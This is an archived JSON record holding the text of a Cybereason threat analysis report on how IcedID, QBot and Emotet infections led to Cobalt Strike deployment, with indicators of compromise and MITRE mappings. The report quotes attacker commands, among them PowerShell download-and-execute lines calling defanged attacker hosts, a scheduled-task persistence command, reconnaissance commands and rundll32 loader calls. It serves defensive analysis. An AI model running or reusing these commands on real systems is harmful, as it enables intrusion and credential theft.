{
    "id": "d3395681-94ab-4bee-b245-da2659c05ad7",
    "created_at": "2023-01-12T15:10:20.981192Z",
    "updated_at": "2025-03-27T02:09:17.853834Z",
    "deleted_at": null,
    "sha1_hash": "b4beefef7b1eeae89b73bb6ba1c0b7c183a796ec",
    "title": "2022-02-10 - Threat Analysis Report- All Paths Lead to Cobalt Strike - IcedID, Emotet and QBot",
    "authors": "",
    "file_creation_date": "2022-05-28T23:21:46Z",
    "file_modification_date": "2022-05-28T23:21:46Z",
    "file_size": 2975012,
    "plain_text": "# THREAT ANALYSIS REPORT: All Paths Lead to Cobalt Strike - IcedID, Emotet and QBot\n\n**[cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot](https://www.cybereason.com/blog/threat-analysis-report-all-paths-lead-to-cobalt-strike-icedid-emotet-and-qbot)**\n\nWritten By\nCybereason Global SOC Team\n\nFebruary 10, 2022 | 13 minute read\n\n\n-----\n\n[The Cybereason Global Security Operations Center Team (GSOC) issues Cybereason Threat Analysis reports to](https://www.cybereason.com/blog/authors/cybereason-global-soc-team)\ninform on impacting threats. The Threat Analysis reports investigate these threats and provide practical\nrecommendations for protecting against them.\n\nIn this Threat Analysis report, the GSOC provides details about three recent attack scenarios where fast-moving\n[malicious actors used the malware loaders IcedID,](https://www.cybereason.com/blog/threat-analysis-report-from-shatak-emails-to-the-conti-ransomware) [QBot, and](https://www.cybereason.com/blog/threat-analysis-report-datoploader-exploits-proxyshell-to-deliver-qbot-and-cobalt-strike) [Emotet to deploy the Cobalt Strike framework on the](https://www.cybereason.com/blog/threat-alert-the-return-of-emotet)\ncompromised systems.\n\nThe deployment of Cobalt Strike as part of an attack significantly increases the severity of the attack due to the\nframework’s high damage potential. One of the attack scenarios that we discuss in this article involves affiliates of\nthe [Conti ransomware group.](https://www.cybereason.com/blog/cybereason-vs.-conti-ransomware)\n\n## Key Points\n\n**Fast-moving adversaries: The threat actors conducted malicious activities in the compromised systems after**\nonly approximately 8 minutes after infecting the systems with the malware loader IcedID, QBot, or Emotet.\nThe malicious actors deployed Cobalt Strike up to approximately 2 hours after accessing the compromised\nsystems.\n**[Targeted phishing emails: Malicious actors, who we attribute as affiliates of the Conti ransomware group,](https://www.cybereason.com/blog/cybereason-vs.-conti-ransomware)**\nspecifically targeted a user by sending the user an email with an attachment (an Excel document) that was\nalmost identical to a legitimate email and email attachment already distributed to other users within the\norganization. The difference was that the attached Excel document contained a malicious macro that\ndistributed IcedID.\n**Detected and prevented: The** [Cybereason XDR Platform effectively detects and prevents the IcedID, QBot,](https://www.cybereason.com/platform)\nand Emotet malware.\n**Cybereason Managed Detection and Response (MDR): The Cybereason GSOC has zero tolerance**\ntowards attacks that involve malware loaders, such as IcedID, QBot, and Emotet, and categorizes such\n[attacks as critical, high-severity incidents. The Cybereason GSOC MDR Team issues a comprehensive report](https://www.cybereason.com/services/managed-detection-response-mdr)\nto customers when such an incident occurs. The report provides an in-depth overview of the incident, which\nhelps scope the extent of compromise and the impact on the customer’s environment. In addition, the report\nprovides attribution information when possible as well as recommendations for mitigating and isolating the\nthreat.\n\n## Introduction\n\n[Cobalt Strike is an adversary simulation framework with the primary use case of assisting red team operations.](https://www.cobaltstrike.com/)\nHowever, Cobalt Strike is also actively used by malicious actors for conducting post-intrusion malicious activities.\nCobalt Strike is a [modular framework with an extensive set of features that are useful to malicious actors, such as](https://www.mandiant.com/resources/defining-cobalt-strike-components#:~:text=Cobalt%20Strike%20is%20a%20commercial,Advanced%20Persistent%20Threats%20(APTs).)\ncommand execution, process injection, and credential theft.\n\nThe deployment of Cobalt Strike as part of an attack significantly increases the severity of the attack: for example,\nonce Cobalt Strike runs on a compromised system, the Cobalt Strike operators can broker the system as an initial\naccess point to other threat actors, including ransomware group affiliates.\n\nIn the period between October 2021 and the time of writing this article, the Cybereason GSOC has observed\nmultiple attack scenarios where malicious actors used malware that is capable of deploying additional malware on\ncompromised systems (i.e. malware loaders) to deploy Cobalt Strike on the systems.\n\nIn this article, we present the activities of the malware loaders and the malicious actors that operated the loaders in\nthree selected attack scenarios. Each scenario involves one of the malware loaders IcedID, QBot, and Emotet, and\nresults in the deployment of Cobalt Strike. One of the attack scenarios that we discuss in this article involves\naffiliates of the Conti ransomware group.\n\n\n-----\n\n[Malicious actors use the IcedID malware to distribute various types of malware, including ransomware, to](https://www.cybereason.com/fundamentals/what-is-ransomware)\ncompromised systems. Malicious actors typically infect systems with IcedID through attachments, usually Microsoft\nOffice documents, in phishing emails. Once deployed on a system, IcedID uses legitimate system utilities to\nconduct malicious activities, such as reconnaissance activities and disabling security mechanisms. Malicious actors\nalso use the IcedID malware to deploy Cobalt Strike on compromised systems.\n\nQBot, also known as Qakbot, is a malware that has been present on the threat landscape since 2007. QBot\noriginally featured information stealing and trojan functionalities, however, the malicious actors that develop QBot\nhave extended the malware with malware loading capabilities. In recent attack campaigns, malicious actors\ndistribute QBot through malicious attachments in phishing emails. QBot downloads and executes additional\n[malware on compromised machines, such as the Cobalt Strike framework, and ransomware, such as REvil and](https://www.cybereason.com/blog/cybereason-vs.-revil-ransomware)\n[ProLock.](https://www.cybereason.com/blog/three-reasons-why-you-should-never-pay-ransomware-attackers)\n\nSince security researchers first discovered the Emotet malware in 2014, the malware has evolved from a traditional\nbanking Trojan to a malware loader. Over the last few years, before authorities [disrupted the infrastructure of](https://www.europol.europa.eu/media-press/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action)\nEmotet operators as part of a global operation in the first quarter of 2021, malicious actors have been using Emotet\nto deliver the Ryuk ransomware to compromised systems.\n\n[On November 15, 2021, security researchers announced the discovery of a new variant of Emotet on the threat](https://twitter.com/gdata_adan/status/1460298879090503681)\n[landscape. The Cybereason GSOC team observed attack scenarios that involved the new Emotet malware shortly](https://www.cybereason.com/blog/threat-alert-the-return-of-emotet)\nthereafter, which involved Emotet deploying Cobalt Strike on compromised systems.\n\n## Analysis\n\n### From IcedID to Cobalt Strike: Conti Ransomware Affiliates\n\nThe figure below depicts an infection using the IcedID malware that results in the deployment of Cobalt Strike. In\nthis scenario, the malicious actors, who we attribute as affiliates of the [Conti ransomware group, specifically](https://www.cybereason.com/blog/cybereason-vs.-conti-ransomware)\ntargeted a user by sending the user an email with an attachment (an Excel document) that is almost identical to a\nlegitimate email and email attachment already distributed to other users within the organization.\n\nThe difference was that the attached Excel document contained a malicious macro. This indicates a potential longterm presence of the actors in the environment:\n\n\n-----\n\n_infection using the IcedID malware_\n\nWhen the targeted user executed the macro, the macro downloaded the executable file of the IcedID malware from\nan attacker-controlled endpoint and then executed the file. The macro downloaded the IcedID executable to the\nhome directory of the user, such as C:\\Users\\test\\javabridge64.exe, where javabridge64.exe is the name of the\nIcedID executable and C:\\Users\\test is the home directory of the user test:\n\n_Malicious Office macro executes IcedID javabridge64.exe as seen in the Cybereason XDR Platform_\n\nApproximately 8 minutes after the malicious Office macro executed IcedID, the malicious actors executed the\n_[SysInfo IcedID command to enumerate relevant system information, such as active processes, and to conduct the](https://www.binarydefense.com/icedid-gziploader-analysis/)_\nfollowing reconnaissance activities:\n\n\n-----\n\nIcedID executed the following command to retrieve a list of the security solutions that are installed on the\ncompromised system:\n\n_wmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List_\n\nIcedID executed the command ipconfig /all to retrieve the networking configuration of the compromised\nsystem.\nIcedID executed the systeminfo.exe Windows utility to retrieve detailed information about the compromised\nsystem, such as operating system version and hardware configuration.\nIcedID executed the following commands to retrieve Active Directory (AD)-related information:\n\n_net view /all_\n\n_net view /all /domain_\n\n_net config workstation_\n\n_net group \"Domain Admins\" /domain_\n\n_nltest /domain_trusts_\n\n_nltest /domain_trusts /all_trusts_\n\n\n-----\n\n_IcedID reconnaissance activities as seen in the_\n\n_Cybereason XDR Platform_\n\n[Approximately 20 minutes after conducting reconnaissance activities, the malicious actors executed the ExecAdmin](https://www.binarydefense.com/icedid-gziploader-analysis/)\nIcedID command that attempts to elevate user privileges using a known Windows User Account Control (UAC)\nbypass that leverages the fodhelper Windows utility.\n\n[After approximately 5 minutes, the malicious actors executed the Exec IcedID command to execute code by](https://www.binarydefense.com/icedid-gziploader-analysis/)\ninjecting the code into a cmd.exe instance. Approximately 21 minutes later, the malicious actors executed a Cobalt\nStrike loader using the command rundll32 adobe.dll,kasim (where kasim is a dynamic-link library - DLL - entry\npoint):\n\n\n-----\n\n_Execution of Cobalt Strike loader as seen in the Cybereason XDR Platform_\n\nA few minutes after executing the Cobalt Strike loader, the actors downloaded and executed PowerShell code from\nthe attacker-controlled endpoint with an IP address of 185.70.184[.]8 by executing the PowerShell command:\n\n_IEX ((new-object net.webclient).downloadstring('http://185.70.184[.]8:80/a'))._\n\n[This attributes the actors as Conti affiliates, since the Conti group operated the endpoint with the IP address](https://twitter.com/AltShiftPrtScn/status/1467323259137974273)\n_185.70.184[.]8 in the week when the attack that we discussed took place. In addition, the security community has_\n[observed Conti affiliates using the IcedID malware to deploy Cobalt Strike on compromised systems.](https://thedfirreport.com/2021/05/12/conti-ransomware/)\n\nTo deploy the IcedID malware, the Conti affiliates targeted a particular user. At a larger scale, in the middle of 2021,\nwe observed malicious actors deploying the IcedID malware on systems as part of the “stolen images evidence”\ncampaign, which we discuss in the following section.\n\n**Stolen Images Evidence Campaign**\n\n[This “stolen images evidence” campaign involved phishing emails that legitimate organization contact forms had](https://www.microsoft.com/security/blog/2021/04/09/investigating-a-unique-form-of-email-delivery-for-icedid-malware/)\ngenerated and sent to the targeted users – the contact form recipient. The emails contained legal threats related to\ncopyright infringement due to the use of copyright-protected images that the targeted user had apparently stolen.\nThe emails urged the recipient to sign into a Google page that supposedly lists the images. After the user signed\ninto the page using valid Google credentials, the page downloaded and executed a malicious JavaScript (.js) script\nusing the Windows wscript utility.\n\nThe script executed a Base64-encoded PowerShell command to download and execute the IcedID malware, for\nexample:\n\n_IEX(New-Object Net.WebClient).downloadString('http://minerdone[.]top/222g100/index.php’)._\n\nThe execution of this PowerShell command led to downloading and executing a DLL through the DllRegisterServer\nentry point, such as:\n\n_rundll32.exe C:\\Users\\user\\AppData\\Local\\Temp\\VhfNmz.dat,DllRegisterServer._\n\nThis DLL conducted the first stage of deployment of the IcedID malware and we refer to it as first-stage IcedID DLL:\n\n\n-----\n\n_Download and execution of first-stage IcedID DLL as seen in the Cybereason XDR Platform_\n\nThe first-stage DLL gathered information about the compromised machine, such as hardware and operating system\ninformation, and downloaded data from an attacker-controlled endpoint, such as grenademetto[.]uno. The data was\nencrypted using a symmetric encryption key.\n\nThe first-stage IcedID DLL decrypted the data that it had downloaded, which contained a DLL file and a data file\nthat typically had the name license.dat. The first-stage IcedID DLL typically wrote the DLL file in the user’s\n_%LocalAppData% directory, such as:_\n\n_C:\\Users\\user\\AppData\\Local\\Temp\\rebuildx32.tmp, and the license.dat file in the user’s %AppData% directory._\n\nThe first-stage IcedID DLL then executed the DLL file, such as:\n\n_rundll32.exe “C:\\Users\\user\\AppData\\Local\\Temp\\rebuildx32.tmp\",update /i:\"ApproveFinish\\license.dat\", which we_\nrefer to as second-stage IcedID DLL.\n\nThe main functionality of the second-stage IcedID DLL was to locate and process the license.dat file. license.dat\ncontained encrypted content that implemented the IcedID malware. The second-stage IcedID DLL decrypted the\ncontent of license.dat and executed the IcedID malware by injecting the malware into a legitimate Windows\nprocess, such as chrome.exe:\n\n_Second-stage IcedID DLL_\n\n_injects IcedID into chrome.exe as seen in the Cybereason XDR Platform_\n\n### From QBot to Cobalt Strike\n\n\n-----\n\nThe figure below depicts an infection using the QBot malware that results in the deployment of Cobalt Strike:\n\n_An infection using the QBot malware_\n\nMalicious actors distribute QBot as attachments, typically Microsoft Office Excel documents, to phishing emails. The\nOffice Excel application prompts the user that has opened the document that distributes QBot to enable Office\nmacro execution. When the Office macro executes, the macro first downloads the QBot malware from an attackercontrolled endpoint and then executes the malware.\n\nIn the attack scenario that we analyzed, the macro stored the file that implements the QBot malware in the\n_%ProgramData% directory, such as C:\\ProgramData, with the filename extension .ocx - Volet1.ocx (other names_\ninclude, for example, Volet2.ocx and Volet3.ocx). The .ocx file was a Windows DLL file that the macro executed\nusing the regsvr32 Windows utility. The DLL unpacked and loaded a Windows DLL named stager_1.dll that\nimplements the main QBot functionalities.\n\nIn addition, the DLL injected stager_1.dll into a legitimate Windows process - msra.exe:\n\n\n-----\n\n_Office_\n\n_Excel macro executes QBot as seen in the Cybereason XDR Platform_\n\nApproximately 6 minutes after injecting stager_1.dll into msra.exe, Qbot conducted reconnaissance activities by\n[executing the commands net,](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems) [arp,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/arp) [ipconfig,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig) [netstat,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) [nslookup,](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup) [route, and](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/route_ws2008) [whoami. The figure below depicts the](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)\nexecution of these commands, including command line parameters:\n\n\n-----\n\n_Qbot reconnaissance activities as seen in the Cybereason XDR Platform_\n\nApproximately 1 minute after conducting reconnaissance activities, QBot established persistence on the\ncompromised system by executing the following command:\n\n_schtasks.exe /Create /F /TN \"{AO8F7C8F-D95F-4395-8732-9818EO0F3DB2}\" /TR \"cmd /c start /min \\\"\\\"_\n_powershell.exe -Command_\n_IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path_\n_HKCU:\\SOFTWARE\\Cvdijvkees).omowidpdnpcwb))) \" /SC MINUTE /MO 30_\n\nThis command creates a scheduled task named {AO8F7C8F-D95F-4395-8732-9818EO0F3DB2} that periodically\nexecutes Base64-encoded PowerShell code stored in the registry key\n_HKEY_CURRENT_USER\\SOFTWARE\\Cvdijvkees._\n\n[Approximately 48 minutes after creating a scheduled task, Qbot injected Rubeus, a tool for attacking Kerberos](https://github.com/GhostPack/Rubeus)\ndeployments, into the legitimate Windows Update process wuauclt.exe. After approximately 18 minutes, QBot stole\n[web browser data, such as cookies and browsing history, using the recovery functionality of the esentutl Windows](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875546(v=ws.11))\nutility.\n\n[After approximately 2 minutes, QBot attempted to exploit the PrintNightmare vulnerability by executing the](https://www.cybereason.com/blog/threat-alert-printnightmare-critical-vulnerability-in-windows-print-spooler) _Invoke-_\n_Nightmare PowerShell command to create an administrative user with the username admin1 and password_\n_Password._\n\nAfter approximately 48 minutes, QBot injected a Cobalt Strike module into msra.exe that contacted attackercontrolled endpoints known to be associated with Cobalt Strike at the time the attack took place:\n\n\n-----\n\n_Qbot uses the esentutl Windows utility to steal web browser data (in the Cybereason XDR Platform)_\n\n_Qbot injects Rubeus into wuauclt.exe and executes Invoke-Nightmare as seen in the Cybereason XDR Platform_\n\n### From Emotet to Cobalt Strike\n\nThe figure below depicts an infection using the Emotet malware that results in the deployment of Cobalt Strike:\n\n\n-----\n\n_An infection using the Emotet malware_\n\nMalicious actors distribute Emotet as attachments, typically Microsoft Office Word or Excel documents, to phishing\nemails. In addition to Office documents, malicious actors distribute Emotet through links that lead to Office\ndocuments, archive files that store Office documents, and Universal Windows Application installation packages that\ndownload and execute Emotet when a user executes the installation package:\n\n\n-----\n\n_Phishing email with attached Microsoft Word doc that distributes Emotet_\n\n**Distribution: Office Word Document**\n\nIf an Office Word document distributes Emotet, the Office Word application first prompts the user that has opened\nthe document to enable Office macro execution:\n\n_Office Word_\n\n_application prompts a user to enable macro execution_\n\n\n-----\n\nWhen the user enables macro execution, a malicious Office macro that is part of the Word document and that\ndistributes Emotet executes. The macro first deobfuscates macro code by removing character arrays, such as Cew\n(see the figure below), and then executes the deobfuscated macro code:\n\n_Implementation of a malicious macro that distributes Emotet_\n\nThe de-obfuscated macro code executes PowerShell code. The PowerShell code establishes a connection to an\nattacker-controlled endpoint and downloads Emotet to the %ProgramData% directory, such as C:\\ProgramData.\n\nEmotet typically arrives from the attacker-controlled endpoint in the form of a DLL file that the PowerShell code\nstores under a random filename in the %ProgramData% directory. The PowerShell code then uses the rundll32\nWindows utility to execute Emotet:\n\n_De-obfuscated macro code executes PowerShell that downloads and executes Emotet as seen in the Cybereason_\n_XDR Platform_\n\nAlternatively to executing the PowerShell code directly, the de-obfuscated macro code may first create a Windows\nBatch (.bat) file in the %ProgramData% directory under a random name, such as C:\\ProgramData\\sdfhiuwu.bat or\n_yksds.bat, and then execute the file. The .bat file stores obfuscated code that includes Base-64 encoded code and_\ncode that is stored in multiple string variables.\n\nThe obfuscated code in the .bat file executes the PowerShell code that downloads and then uses the rundll32\nWindows utility to execute Emotet:\n\n\n-----\n\n_De-obfuscated macro code creates a Windows Batch file_\n\n_A Windows batch (.bat) file that contains obfuscated code_\n\n\n-----\n\n_Execution of .bat file (yksds.bat) that executes PowerShell code which downloads and executes Emotet as seen in_\n_the Cybereason XDR Platform_\n\n[The PowerShell code uses the rundll32 Windows utility and specifies the DLL entry point Control_RunDLL or](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32)\n_[DllRegisterServer to execute Emotet. We observed that rundll32 maps the Emotet DLL file under the internal name](https://docs.microsoft.com/en-us/windows/win32/menurc/versioninfo-resource)_\nof X.dll:\n\n_rundll32 executes Emotet: DllRegisterServer DLL entry point as seen in the Cybereason XDR Platform_\n\n_rundll32 maps an Emotet DLL file under the internal name of X.dll as seen in the Cybereason XDR Platform_\n\n\n-----\n\n**Distribution: Office Excel Document**\n\nIf an Office Excel document distributes Emotet, the Office Excel application prompts the user that has opened the\ndocument to enable Office macro execution. The Excel document contains several hidden Excel worksheets that\nstore malicious Office macros that distribute Emotet.\n\nWhen the user enables macro execution, the Office macros execute:\n\n_Office Excel_\n\n_application prompts a user to enable macro execution_\n\nThe macros establish a connection to an attacker-controlled endpoint to download the Emotet malware. Emotet\ntypically arrives from the attacker-controlled endpoint in the form of a DLL file that the macros store under a\nfilename with the extension .ocx, such as besta.ocx, bestb.ocx, or bestc.ocx.\n\nThe macros use the rundll32 Windows utility and specify the DLL entry point Control_RunDLL or DllRegisterServer\nto execute Emotet. The macros may obfuscate the DLL entry point name by appending the ampersand (&)\ncharacter to individual characters of the name:\n\n\n-----\n\n_rundll32 executes Emotet: DllRegisterServer DLL entry point as seen in the Cybereason XDR Platform_\n\n**Malicious Activities**\n\nWhen Emotet executes on a compromised system, the malware first establishes persistence by creating system\nservices that start at system startup or by creating registry values at the\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key:_\n\n_Emotet (DLL file: oxneternhgbtah.ybc) establishes persistence on compromised system as seen in the Cybereason_\n_XDR Platform_\n\nEmotet then executes processes that conduct malicious activities. The processes that Emotet executes have\nrandom names and are children processes of the process of the rundll32 utility that executes Emotet.\n\nIn the attack scenario that we analyzed, Emotet executed a process that steals cookies or web and email\ncredentials from client credential databases. Emotet used the keyword scomma in the process command line to\n[execute WebBrowserPassView, a tool that steals web credentials from browser credential databases. Emotet then](https://www.virusbulletin.com/virusbulletin/2019/10/vb2019-paper-exploring-emotet-elaborate-everyday-enigma/)\nexfiltrated data from the compromised system to attacker-controlled endpoints:\n\n\n-----\n\n_Emotet executes processes that conduct_\n\n_malicious activities as seen in the Cybereason XDR Platform_\n\n_Emotet executes the WebBrowserPassView tool as seen in the Cybereason XDR Platform_\n\n_Emotet exfiltrates data as seen in the Cybereason XDR Platform_\n\n\n-----\n\nAfter Emotet exfiltrated data, the Emotet operators deployed the Cobalt Strike framework on the compromised\nsystem. Emotet deployed a Cobalt Strike beacon in the form of a DLL file and executed the beacon by invoking the\n_DllRegisterServer DLL entry point._\n\n## Detection and Prevention\n\n### Cybereason XDR Platform\n\n[The Cybereason XDR Platform is able to detect and prevent IcedID, QBot, and Emotet using multi-layer protection](https://www.cybereason.com/platform)\nthat detects and blocks malware with threat intelligence, machine learning, and Next-gen Antivirus (NGAV)\ncapabilities:\n\n_Cybereason XDR_\n\n_Platform detects IcedID injecting code into a cmd.exe instance_\n\n_Cybereason XDR Platform detects IcedID executing a Cobalt Strike loader implemented in adobe.dll_\n\n_Cybereason XDR Platform detects a malicious Office macro executing QBot using the regsvr32 Windows utility_\n\n\n-----\n\n_Cybereason XDR Platform detects a malicious Office Excel document that distributes Emotet_\n\n### Cybereason GSOC MDR\n\nThe Cybereason GSOC recommends the following:\n\n[Enable the Anti-Malware feature in the Cybereason NGAV module and enable the Detect and Prevent modes](https://nest.cybereason.com/documentation/product-documentation/190/anti-malware-settings)\nof this feature.\nSecurely handle email messages that originate from external sources. This includes disabling hyperlinks and\ninvestigating the content of email messages to identify phishing attempts.\nThreat Hunting with Cybereason: The Cybereason MDR team provides its customers with custom hunting\nqueries for detecting specific threats - to find out more about threat hunting and Managed Detection and\n[Response with the Cybereason Defense Platform, contact a Cybereason Defender here.](https://www.cybereason.com/services/managed-detection-response-mdr#form)\n\n[For Cybereason customers: More details available on the NEST including custom threat hunting queries](https://nest.cybereason.com/knowledgebase/5191271)\nfor detecting this threat.\n\nCybereason is dedicated to teaming up with defenders to end cyber attacks from endpoints to the enterprise to\n[everywhere. Schedule a demo today to learn how your organization can benefit from an operation-centric approach](https://www.cybereason.com/request-a-demo)\nto security.\n\n## Indicators of Compromise\n\n**Executables** SHA-1 hash:\n\n_a4d415c07b4ff77c6bd792c32fc46bfc6a1b0354_\n\nSHA-1 hash:\n\n_e8992a283f9f37dec617b305db2790d9112d3a20_\n\n\n-----\n\n**Domains** _zasewalli[.]fun_\n\n_endofyour[.]ink_\n\n_pedrosimanez[.]fun_\n\n_kingflipp[.]online_\n\n_beliale232634[.]at_\n\n_belialw869367[.]at_\n\n_belialq449663[.]at_\n\n**IP Addresses** _23.111.114[.]52_\n\n_104.168.44[.]130_\n\n_185.70.184[.]8_\n\n## MITRE ATT&CK Techniques\n\n**Initial Access** **Execution** **Persistence** **Defense**\n**Evasion**\n\n\n**Discovery** **Lateral**\n**Movement**\n\nAccount\nDiscovery Remote\nServices:\n[Remote](https://attack.mitre.org/techniques/T1021/001/)\nDesktop\nProtocol\n\nDomain\n[Trust](https://attack.mitre.org/techniques/T1482/)\nDiscovery\n\nNetwork\n[Service](https://attack.mitre.org/techniques/T1046/)\nScanning\n\nRemote\n[System](https://attack.mitre.org/techniques/T1018/)\nDiscovery\n\n\n**Exfiltration**\n\nExfiltration\nOver\nAlternative\nProtocol\n\n\nPhishing:\n[Spearphishing](https://attack.mitre.org/techniques/T1566/001/)\nAttachment\n\n\nUser\n[Execution:](https://attack.mitre.org/techniques/T1204/002/)\nMalicious File\n\nWindows\n[Management](https://attack.mitre.org/techniques/T1047/)\nInstrumentation\n\n\nScheduled\nTask/Job:\nScheduled\nTask\n\n\nAbuse\nElevation\nControl\nMechanism:\nBypass\nUser\nAccount\nControl\n\nSigned\nBinary\n[Proxy](https://attack.mitre.org/techniques/T1218/010/)\nExecution:\nRegsvr32\n\nSigned\nBinary\n[Proxy](https://attack.mitre.org/techniques/T1218/011/)\nExecution:\nRundll32\n\nModify\nregistry\n\n\n**Credential**\n**Access**\n\nCredentials\n[from Web](https://attack.mitre.org/techniques/T1555/003/)\nBrowsers\n\n\n## About the Researchers:\n\n\n-----\n\n**Eli Salem, Senior Security Analyst, Cybereason Global SOC**\n\nEli is a lead threat hunter and malware reverse engineer at Cybereason. He has worked in the private sector of the\ncyber security industry since 2017. In his free time, he publishes articles about malware research and threat\nhunting.\n\n**Aleksandar Milenkoski, Senior Malware and Threat Analyst, Cybereason Global SOC**\n\nAleksandar Milenkoski is a Senior Malware and Threat Analyst with the Cybereason Global SOC team. He is\ninvolved primarily in reverse engineering and threat research activities. Aleksandar has a PhD in system security.\nFor his research activities, he has been awarded by SPEC (Standard Performance Evaluation Corporation), the\nBavarian Foundation for Science, and the University of Würzburg, Germany. Prior to Cybereason, his work\nfocussed on research in intrusion detection and reverse engineering security mechanisms of the Windows\noperating system.\n\n**Brian Janower, Security Analyst, Cybereason Global SOC**\n\nBrian Janower is a Security Analyst with the Cybereason Global SOC team. He is involved in malware analysis and\ntriages security incidents effectively and precisely. Brian has a deep understanding of the malicious operations\nprevalent in the current threat landscape. He is in the process of obtaining a Bachelor of Science degree in\nSystems Information & Cyber.\n\n**Yonatan Gidnian, Senior Security Analyst and Threat Hunter, Cybereason Global SOC**\n\nYonatan Gidnian is a Senior Security Analyst and Threat Hunter with the Cybereason Global SOC team. Yonatan\nanalyses critical incidents and hunts for novel threats in order to build new detections. He began his career in the\nIsraeli Air Force where he was responsible for protecting and maintaining critical infrastructures. Yonatan is\npassionate about malware analysis, digital forensics, and incident response.\n\n\n-----\n\nRotem Rostami, Security Analyst, Cybereason Global SOC\n\nRotem Rostami is a Security Analyst with the Cybereason Global SOC (GSOC) team. She is involved in malware\nanalysis activities and triages security incidents effectively and precisely. Rotem has a deep understanding of the\nmalicious operations prevalent in the current threat landscape. Rotem has been working in the cybersecurity\nindustry since 2018.\n\nAbout the Author\n\n**Cybereason Global SOC Team**\n\nThe Cybereason Global SOC Team delivers 24/7 Managed Detection and Response services to customers on\nevery continent. Led by cybersecurity experts with experience working for government, the military and multiple\nindustry verticals, the Cybereason Global SOC Team continuously hunts for the most sophisticated and pervasive\nthreats to support our mission to end cyberattacks on the endpoint, across the enterprise, and everywhere the\nbattle moves.\n\n[All Posts by Cybereason Global SOC Team](https://www.cybereason.com/blog/authors/cybereason-global-soc-team)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-10 - Threat Analysis Report- All Paths Lead to Cobalt Strike - IcedID, Emotet and QBot.pdf"
    ],
    "report_names": [
        "2022-02-10 - Threat Analysis Report- All Paths Lead to Cobalt Strike - IcedID, Emotet and QBot.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536220,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653780106,
    "ts_modification_date": 1653780106,
    "files": {
        "pdf": "https://archive.orkl.eu/b4beefef7b1eeae89b73bb6ba1c0b7c183a796ec.pdf",
        "text": "https://archive.orkl.eu/b4beefef7b1eeae89b73bb6ba1c0b7c183a796ec.txt",
        "img": "https://archive.orkl.eu/b4beefef7b1eeae89b73bb6ba1c0b7c183a796ec.jpg"
    }
}